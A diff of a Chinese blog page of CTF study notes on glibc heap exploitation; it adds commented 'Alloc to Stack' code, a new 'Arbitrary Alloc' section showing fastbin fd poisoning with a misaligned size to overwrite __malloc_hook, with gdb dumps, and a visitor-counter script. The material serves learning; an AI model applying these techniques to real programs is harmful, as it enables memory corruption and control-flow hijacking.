@@ -190,7 +190,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      15.6k 字
+      16.5k 字
     </span>
   
 
@@ -200,7 +200,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      361
+      380
        分钟
     </span>
   
@@ -234,7 +234,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2 分钟前
+                  不可视境界线最后变动于：20 分钟前
                 
               </p>
             
@@ -615,7 +615,7 @@ b--&gt;|32 &amp; != 16|largebin_index_32
 <h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>前文所讲的 Fastbin Double Free 与 house of spirit 技术和本节所讲的Alloc to Stack，它们的本质都在于 fastbin 链表的特性：<strong>当前 chunk 的 fd 指针指向下一个 chunk。</strong> </p>
 <p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
 <h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//0x10是user date, chunk1指向的是fd指针</span><br><br>    <span class="hljs-built_in">free</span>(chunk1); <span class="hljs-comment">//free chunk1之后fastbin中只有这一个chunk, fd指向NULL, </span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk; <span class="hljs-comment">//修改为8字节的指针, 将fd指针赋值为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//将chunk1取出</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//malloc出了一个fack_chunk(stack_chunk), 这样我们就可以修改栈上的数据了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1<br>0x602010:   0x00007fffffffde60  0x0000000000000000<br>0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk<br></code></pre></td></tr></table></figure>
@@ -627,7 +627,31 @@ b--&gt;|32 &amp; != 16|largebin_index_32
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;<br> → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax<br><span class="hljs-meta">   $</span><span class="bash">rax   : 0x00007fffffffde70</span><br><br>0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst<br>0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst<br>0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst<br>0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]<br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-<br>0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-<br>0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-<br>0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]<br>0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]<br>0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-<br>0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]<br>0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<br></code></pre></td></tr></table></figure>
 
 <h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p>
-<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk
+<h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 <strong>bss、heap、data、stack</strong> 等等。</p>
+<h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。** </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;	<span class="hljs-comment">//1ad5是malloc_hook的位置, 由于fd指针指向的是chunk的开头, </span><br>    										<span class="hljs-comment">//所以要覆盖malloc_hook要往前8字节使其成为user date</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//malloc出temp</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//往这个指针里面写内容就可以改写malloc_hook</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的 <strong>0x7ffff7dd1af5</strong> 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以<strong>字节错位</strong>的情况。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sh">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0<br></code></pre></td></tr></table></figure>
+
+<p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这里的size指用户区域，因此会小于2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></td></tr></table></figure>
+
+<p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br><br>0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f<br></code></pre></td></tr></table></figure>
+
+<p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></td></tr></table></figure>
+
+<p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p>
+<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;<br> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax<br><span class="hljs-meta"></span><br><span class="hljs-meta"> $</span><span class="bash">rax   : 0x7ffff7dd1afd</span><br><br>0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f<br>0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f<br>0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x00	00000000000000<br>0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<h3 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
+<h2 id="具体题目遇到再说"><a href="#具体题目遇到再说" class="headerlink" title="具体题目遇到再说"></a>具体题目遇到再说</h2><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p>
+<p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>
+<p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>
+<h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>为了方便，我们将分配作为note的chunk称为note chunk
 <a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>与上条类似，我们同样将分配作为content的chunk称为content chunk
 <a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
             </div>
@@ -746,6 +770,30 @@ b--&gt;|32 &amp; != 16|largebin_index_32
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
   </div>
   
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
 
   
 
@@ -807,6 +855,8 @@ b--&gt;|32 &amp; != 16|largebin_index_32
   <script  src="/js/local-search.js" ></script>
 
 
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
